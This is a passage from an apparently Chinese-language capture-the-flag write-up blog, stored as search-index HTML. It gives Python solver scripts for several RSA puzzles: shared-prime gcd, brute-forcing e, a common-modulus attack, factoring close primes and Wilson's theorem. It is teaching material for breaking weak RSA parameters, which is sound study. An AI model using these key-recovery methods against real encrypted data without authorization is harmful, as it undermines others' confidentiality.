class="number">17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span></span><br><span class="line"></span><br><span class="line">n16 = <span class="number">23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span></span><br><span class="line">c16 = <span class="number">10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span></span><br><span class="line"></span><br><span class="line">n17 = <span class="number">19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span></span><br><span class="line">c17 = <span class="number">3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span></span><br><span class="line"></span><br><span class="line">n18 = <span class="number">19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span></span><br><span class="line">c18 = <span class="number">6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span></span><br><span class="line"></span><br><span class="line">n19 = <span class="number">26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span></span><br><span class="line">c19 = <span class="number">386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span></span><br><span class="line"></span><br><span class="line">n=[n0,n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19]</span><br><span class="line">c=[c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16,c17,c18,c19]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(n)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(n)):</span><br><span class="line">        <span class="keyword">if</span>(i!=j):</span><br><span class="line">            <span class="keyword">if</span>(gmpy2.gcd(n[i],n[j])!=<span class="number">1</span>):   <span class="comment">#对不同的n进行 欧几里得算法，以求出最大公约数(p)</span></span><br><span class="line">                print(i,j)                 <span class="comment">#输出对应的n的序号            </span></span><br><span class="line">                p = gmpy2.gcd(n[i],n[j])</span><br><span class="line">                print(<span class="string">"p = "</span>,p)</span><br><span class="line">                q = n[i] // p</span><br><span class="line">                print(<span class="string">"q = "</span>,q)</span><br><span class="line">                d = gmpy2.invert(e , (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">                print(<span class="string">"d = "</span>,d)</span><br><span class="line">                m = pow(c[i],d,n[i])</span><br><span class="line">                print(<span class="string">"m = "</span>,m)</span><br><span class="line"></span><br><span class="line">print(libnum.n2s(int(m)))</span><br></pre></td></tr></table></figure></p>
<h3 id="HDCTF2019-bbbbbbrsa-p-n-c-范围内随机产生e"><a href="#HDCTF2019-bbbbbbrsa-p-n-c-范围内随机产生e" class="headerlink" title="[HDCTF2019]bbbbbbrsa(p,n,c,范围内随机产生e)"></a>[HDCTF2019]bbbbbbrsa(p,n,c,范围内随机产生e)</h3><p>e的范围在50000-70000之间，遍历每一个可能的e，并求出对应的d，然后求解明文<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n=<span class="number">37421829509887796274897162249367329400988647145613325367337968063341372726061</span></span><br><span class="line">p =gmpy2.mpz(<span class="number">177077389675257695042507998165006460849</span>)</span><br><span class="line">q =gmpy2.mpz(n//p)</span><br><span class="line">e =gmpy2.mpz(<span class="number">65537</span>)</span><br><span class="line">c=<span class="number">2373740699529364991763589324200093466206785561836101840381622237225512234632</span></span><br><span class="line"></span><br><span class="line">phi= (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">50000</span>,<span class="number">70000</span>):</span><br><span class="line">  <span class="keyword">if</span> gmpy2.gcd(e, phi) == <span class="number">1</span>:</span><br><span class="line">    d = gmpy2.invert(e, phi)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      print(libnum.n2s(pow(c,d,n)))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      e -= <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h3 id="BJDCTF2020-RSA-相同素因子"><a href="#BJDCTF2020-RSA-相同素因子" class="headerlink" title="[BJDCTF2020]RSA(相同素因子)"></a>[BJDCTF2020]RSA(相同素因子)</h3><p>n1和n2具有相同的素因子q，通过gcd(n1,n2)求出q,从而等到p1和p2<br>e在100000范围内，爆破即可，由pow(294,e,n)来爆破e<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n1=<span class="number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span></span><br><span class="line">c=<span class="number">381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018</span></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">100000</span>):</span><br><span class="line">  <span class="keyword">if</span> pow(<span class="number">294</span>,e,n1)==c:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><br>e=52361,现在已知p1,q,e求出私钥d<br>d1=1276549612667235496073062413684557057181896069650439227077329803054445335686784808377690923037459599873467009883319010270651875121757429604270875839653269929942067949999116415472966763781703261391783789416696579230039360655275426092524646237514553620843296246939598642850610281529372695529557731864284109340420883357507020305531046480491317900328979582041526594305177901608995742294702167254904719694767575926422389285466234470975493213355894905893794399011239178089769159371839248867254033385259727103135858943287108430964746755639150797845621865216873608528036490651449334996737443463808057027185022123795910233321<br>现已知c1,d1,n1，可求出明文<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">c=<span class="number">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120</span></span><br><span class="line">d=<span class="number">1276549612667235496073062413684557057181896069650439227077329803054445335686784808377690923037459599873467009883319010270651875121757429604270875839653269929942067949999116415472966763781703261391783789416696579230039360655275426092524646237514553620843296246939598642850610281529372695529557731864284109340420883357507020305531046480491317900328979582041526594305177901608995742294702167254904719694767575926422389285466234470975493213355894905893794399011239178089769159371839248867254033385259727103135858943287108430964746755639150797845621865216873608528036490651449334996737443463808057027185022123795910233321</span></span><br><span class="line">n=<span class="number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span></span><br><span class="line">print(libnum.n2s(pow(c,d,n)))</span><br></pre></td></tr></table></figure></p>
<h3 id="BJDCTF2020-rsa-output-共模攻击"><a href="#BJDCTF2020-rsa-output-共模攻击" class="headerlink" title="[BJDCTF2020]rsa_output(共模攻击)"></a>[BJDCTF2020]rsa_output(共模攻击)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x2, y2, r = exgcd(b, a%b)</span><br><span class="line">    x1 = y2</span><br><span class="line">    y1 = x2-(a//b)*y2</span><br><span class="line">    <span class="keyword">return</span> x1, y1, r</span><br><span class="line"></span><br><span class="line">n=gp.mpz(<span class="number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span>)</span><br><span class="line">c1=gp.mpz(<span class="number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span>)</span><br><span class="line">c2=gp.mpz(<span class="number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span>)</span><br><span class="line">e1=gp.mpz(<span class="number">2767</span>)</span><br><span class="line">e2=gp.mpz(<span class="number">3659</span>)</span><br><span class="line"></span><br><span class="line">r1, r2, t = exgcd(e1, e2)</span><br><span class="line">m = gp.powmod(c1, r1, n) * gp.powmod(c2, r2, n) % n</span><br><span class="line">print(bytes.fromhex(str(hex(m)[<span class="number">2</span>:])))</span><br></pre></td></tr></table></figure>
<h3 id="ACTF新生赛2020-crypto-rsa3-p与q大小相近"><a href="#ACTF新生赛2020-crypto-rsa3-p与q大小相近" class="headerlink" title="[ACTF新生赛2020]crypto-rsa3(p与q大小相近)"></a>[ACTF新生赛2020]crypto-rsa3(p与q大小相近)</h3><p>p,q相距过大或过近时，可考虑使用yafu分解n<br>这里直接分解n，得到p,q<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">q=gmpy2.mpz(<span class="number">13326909050357447643526585836833969378078147057723054701432842192988717649385731430095055622303549577233495793715580004801634268505725255565021519817179293</span>)</span><br><span class="line">p=gmpy2.mpz(<span class="number">13326909050357447643526585836833969378078147057723054701432842192988717649385731430095055622303549577233495793715580004801634268505725255565021519817179231</span>)</span><br><span class="line">c=<span class="number">1457390378511382354771000540945361168984775052693073641682375071407490851289703070905749525830483035988737117653971428424612332020925926617395558868160380601912498299922825914229510166957910451841730028919883807634489834128830801407228447221775264711349928156290102782374379406719292116047581560530382210049</span></span><br><span class="line">phi_n= (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">m=pow(c,d,p*q)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure></p>
<h3 id="RoarCTF2019-babyRSA-威尔逊定理"><a href="#RoarCTF2019-babyRSA-威尔逊定理" class="headerlink" title="[RoarCTF2019]babyRSA(威尔逊定理)"></a>[RoarCTF2019]babyRSA(威尔逊定理)</h3><p>求出p,q从而求出r即可，但是这里有一个问题，在myGetPrime方法中出现了阶乘取模，在这使用威尔逊定理即可解决<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wilson</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    ans = <span class="number">1</span></span><br><span class="line">    temp = gmpy2.powmod(<span class="number">-1</span>, <span class="number">1</span>, a)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(b + <span class="number">1</span>, a):</span><br><span class="line">        ans = (ans * gmpy2.invert(i, a)) % a</span><br><span class="line">    <span class="keyword">return</span> (ans * temp) % a</span><br><span class="line">A1=<span class="number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span></span><br><span class="line">B1=<span class="number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span></span><br><span class="line">A2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span></span><br><span class="line">B2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span></span><br><span class="line">p= sympy.nextprime(wilson(A1,B1))</span><br><span class="line">q= sympy.nextprime(wilson(A2,B2))</span><br><span class="line">n=<span class="number">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span></span><br><span class="line">c=<span class="number">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span></span><br><span class="line">e=<span class="number">0x1001</span></span><br><span class="line">r = n//(p*q)</span><br><span class="line">d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>)*(r<span class="number">-1</span>))</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure></p>
<h3 id="AFCTF2018-可怜的RSA-public-key-amp-flag-enc"><a href="#AFCTF2018-可怜的RSA-public-key-amp-flag-enc" class="headerlink" title="[AFCTF2018]可怜的RSA(public.key&amp;flag.enc)"></a>[AFCTF2018]可怜的RSA(public.key&amp;flag.enc)</h3><p>通过公钥文件pub.key获取n和e<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">public = RSA.importKey(open(<span class="string">"public.key"</span>).read())</span><br><span class="line">n = public.n</span><br><span class="line">e = public.e</span><br><span class="line">print(<span class="string">"n=\n%s\ne=\n%s"</span>%(n,e))</span><br></pre></td></tr></table></figure><br>n=79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443<br>e=65537<br>使用yafu分解n<br>p=3133337<br>q=25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939<br>求出私钥d并解密,需注意，flag.enc被Base64编码过，需要先解码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n=<span class="number">79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span> </span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=<span class="number">3133337</span></span><br><span class="line">q=<span class="number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span></span><br><span class="line">d = int(gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br><span class="line">key_info = RSA.construct((n, e, d, p, q))</span><br><span class="line">key = RSA.importKey(key_info.exportKey())</span><br><span class="line">key = PKCS1_OAEP.new(key)</span><br><span class="line">f = open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">c = b64decode(f)</span><br><span class="line">flag = key.decrypt(c)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>
]]></content>
  </entry>
</search>
